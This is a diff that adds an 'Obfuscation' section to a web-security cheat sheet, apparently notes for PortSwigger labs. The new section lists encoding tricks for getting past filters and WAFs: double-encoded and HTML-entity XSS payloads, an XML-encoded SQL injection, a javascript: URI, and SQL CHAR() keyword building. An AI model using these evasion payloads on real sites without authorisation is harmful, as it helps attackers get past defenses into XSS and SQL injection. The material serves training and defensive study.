@@ -489,6 +489,47 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 ```  
 
 [PortSwigger Lab: SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)  
+  
+### Obfuscation
+
+>Double-encode the injection  
+
+```
+/?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
+```  
+
+>HTML encode one or more of the characters  
+
+```html
+<img src=x onerror="&#x61;lert(1)">
+```  
+
+>XML encode for bypassing WAFs  
+
+```xml
+<stockCheck>
+    <productId>
+        123
+    </productId>
+    <storeId>
+         999 &#x53;ELECT * FROM information_schema.tables
+    </storeId>
+</stockCheck>
+```
+
+>Multiple encodings together  
+
+```html
+<a href="javascript:&bsol;u0061lert(1)">Click me</a>
+```  
+
+>SQL CHAR  
+
+```sql
+CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
+```
+
+[Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
 
 ## SSRF - Server Side Request Forgery  
 
